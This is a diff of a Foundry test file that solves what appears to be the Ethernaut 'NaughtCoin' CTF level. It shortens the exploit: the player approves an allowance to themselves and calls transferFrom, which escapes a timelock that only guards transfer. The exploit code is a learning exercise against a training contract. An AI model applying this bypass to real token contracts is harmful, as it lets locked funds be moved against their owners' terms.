@@ -24,8 +24,9 @@ contract TestNaughtCoin is BaseTest {
     }
 
     function setupLevel() internal override {
-        /** CODE YOUR SETUP HERE */
-
+        /**
+         * CODE YOUR SETUP HERE
+         */
         levelAddress = payable(this.createLevelInstance(true));
         level = NaughtCoin(levelAddress);
 
@@ -34,42 +35,22 @@ contract TestNaughtCoin is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
+        /**
+         * CODE YOUR EXPLOIT HERE
+         */
+
+        // We are blocked from transferring tokens until 10 years later.
+        // Here of course we can just warp time to bypass the timelock.
+
+        // But the real solution is about making a transferFrom call.
+        // Even though we are block from transferring tokens, transferFrom is not overriden to have lockTokens modifier.
+        // Therefore if we approve our tokens to ourselves, we can transferFrom them from our account to the contract.
 
         vm.startPrank(player, player);
 
-        // Our tokens are locked for 10 years and we cannot withdraw them via the contract's `transfer` function
-        // because the contract is overriding the OpenZeppelin base function `transfer` adding a `lockTokens` modifier
-        // that check if enough time (10 years) has passed since the timelock
-        // We have two options here:
-        // 1) we wait 10 years
-        // 2) we find another way to transfer our token :D
-        // If we look at the ERC20 from OpenZeppelin (that is an implementation of the EIP20)
-        // we see that there are 2 ways to transfer tokens
-        // 1) via `transfer` that allow the `msg.sender` to transfer an amount to a recipient
-        // 2) via `transferFrom` that allow a `sender` to a `recipient`
-        // In that function the `msg.sender` must have enough `allowance` from the `sender` to make the transfer
-        // If you want to know more look at the official EIP-20 doc: https://eips.ethereum.org/EIPS/eip-20#methods
-        // If you look at `NaughtCoin` they are only preventing us to transfer those coins from the `transfer` function
-        // but not from `transferFrom`!
-
-        // So to solve this challenge what we need to do is:
-        // 1) have a temp account to transfer all the funds to
-        // 2) give to ourself the full allowance on our balance amount (yes, it's stupid but `transferFrom` is not meant to be used to transfer our funds)
-        // 3) use `transferFrom` to transfer our balance from our account to the temp one
-
-        // Create a new users just to send some token
-        address payable tempUser = utilities.getNextUserAddress();
-        vm.deal(tempUser, 1 ether);
-
-        // Approve ourself to manage all the tokens via `transferFrom`
-        uint256 playerBalance = level.balanceOf(player);
-        level.approve(player, playerBalance);
-        level.transferFrom(player, tempUser, playerBalance);
+        level.approve(player, level.balanceOf(player));
+        level.transferFrom(player, address(level), level.balanceOf(player));
 
         vm.stopPrank();
-
-        assertEq(level.balanceOf(player), 0);
-        assertEq(level.balanceOf(tempUser), playerBalance);
     }
 }
